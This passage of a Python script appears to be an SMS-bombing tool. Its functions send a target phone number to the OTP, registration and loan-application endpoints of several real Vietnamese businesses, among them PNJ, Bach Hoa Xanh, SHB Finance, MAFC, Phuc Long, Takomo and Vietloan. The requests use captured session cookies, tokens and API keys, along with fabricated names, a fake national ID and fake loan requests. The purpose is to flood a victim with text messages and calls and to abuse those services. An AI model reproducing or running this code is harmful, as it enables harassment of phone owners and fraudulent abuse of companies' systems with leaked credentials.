    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': sdt,
    }

    response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
    


def send_otp_via_TINIWORLD(sdt):
    cookies = {
        'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
        'dnt': '1',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com',
        'phone': sdt,
    }

    response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
    

def send_otp_via_BACHHOAXANH(sdt):

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://www.bachhoaxanh.com',
        'Referer': 'https://www.bachhoaxanh.com/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'authorization': 'Bearer 48AEFAE5FF6C90A31EBC7BB892756688',
        'deviceid': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'platform': 'webnew',
        'referer-url': 'https://www.bachhoaxanh.com/dang-nhap',
        'reversehost': 'http://bhxapi.live',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'xapikey': 'bhx-api-core-2022',
    }

    json_data = {
        'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'userName': sdt,
        'isOnlySms': 1,
        'ip': '',
    }

    response = requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data)
    


def send_otp_via_shbfinance(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Authorization': 'Bearer',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://www.shbfinance.com.vn',
        'Referer': 'https://www.shbfinance.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'customerName': generate_random_name(),
        'mobileNumber': sdt,
        'campaignCode': '',
        'documentIds': 'Cash',
        'year': 1996,
        'provinceName': 'An Giang',
        'districtName': 'Châu Đốc',
        'district': None,
        'document': 'Vay tiền mặt',
        'lendingAmt': 40000000,
        'loanAmt': 40000000,
        'lendingPeriod': 12,
        'dateOfBirth': '01-Jan-1996',
        'partnerName': 'Website',
        'utmSource': 'WEB',
        'utmMedium': 'form',
        'utmCampaign': 'vay-tien-mat',
    }

    response = requests.post('https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan', headers=headers, json=json_data)
    

def send_otp_via_mafccomvn(sdt):
    cookies = {
        'pll_language': 'vi',
        'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
        'mafcavraaaaaaaaaaaaaaaa_session_': 'BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB',
        'MAFC01f6952f': '018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed',
        'MAFC00000000233': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec',
        'MAFC_101_DID': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9',
        'MAFCed66693a184': '0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'pll_language=vi; BIGipServerPool_www.mafc.com.vn=654334730.20480.0000; mafcavraaaaaaaaaaaaaaaa_session_=BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB; MAFC01f6952f=018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed; MAFC00000000233=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec; MAFC_101_DID=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9; MAFCed66693a184=0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
        'dnt': '1',
        'origin': 'https://mafc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://mafc.com.vn/vay-tien-nhanh',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
    }

    json_data = {
        'usersName': 'tannguyen',
        'password': 'mafc123!',
        'income': 0,
        'currAddress': 'Tp.Hcm',
        'phoneNbr': sdt,
        'nationalId': '034201009872',
        'typeCreate': 'API',
        'name': generate_random_name(),
        'allowQualified': 'Y',
        'email': 'b45b93f099',
        'referralCode': '',
        'age': '1992',
        'vendorCode': 'INTERNAL_MKT',
        'msgName': 'creatlead',
        'priAddress': 'null',
        'campaign': 'null',
        'adsGroupName': 'null',
        'adsName': 'null',
        'paramInfo': '',
        'mktCode': 'null',
        'consentNd13': 'Y',
    }

    response = requests.post(
        'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )



def send_otp_via_phuclong(sdt):

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://order.phuclong.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
        'x-api-key': 'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3',
    }

    # Dữ liệu JSON cho yêu cầu đầu tiên
    json_data_check = {
        'userName': sdt,
    }

    # Dữ liệu JSON cho yêu cầu thứ hai
    json_data_register = {
        'phoneNumber': sdt,
        'fullName': generate_random_name(),
        'email': 'th456do1g110@hotmail.com',
        'password': 'Nqnt7%@hf3',
    }

    # Gửi yêu cầu đầu tiên
    response_check = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/check', headers=headers, json=json_data_check)
    print(response_check.json())

    # Gửi yêu cầu thứ hai
    response_register = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data_register)
    print(response_register.json())


##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################

##################################################################################################################################################################################

def send_otp_via_takomo(sdt):

    cookies = {
        '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
    }

    # Cấu hình headers chung
    headers_get = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'dnt': '1',
        'if-none-match': '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
        'priority': 'u=0, i',
        'referer': 'https://takomo.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    headers_post = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://lk.takomo.vn',
        'priority': 'u=1, i',
        'referer': 'https://lk.takomo.vn/?phone={sdt}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Thực hiện request GET
    params = {
        'phone': sdt,
        'amount': '2000000',
        'term': '7',
        'utm_source': 'pop_up',
        'utm_medium': 'organic',
        'utm_campaign': 'direct_takomo',
        'utm_content': 'mainpage_popup_login',
    }

    response_get = requests.get('https://lk.takomo.vn/', params=params, cookies=cookies, headers=headers_get)

    

    # Thực hiện request POST
    json_data = {
        'data': {
            'phone': sdt,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)

    

		
def tv360(phone):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def fb(phone):
    cookies = {
    'con.unl.lat': '1720112400',
    'con.unl.sc': '1',
    '_gid': 'GA1.3.2048602791.1720189695',
    '_tt_enable_cookie': '1',
    '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
    '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
    '_fbp': 'fb.2.1720189698853.917828572155116943',
    '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
    '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
    '_gcl_au': '1.1.888803755.1720189704',
    'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
    '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
    '_gat_UA-3729099-1': '1',
    '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
    '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
    '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
    'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
    'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
    'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
    '_ga': 'GA1.3.697835917.1720189695',
    '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
    'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
    'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
    '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
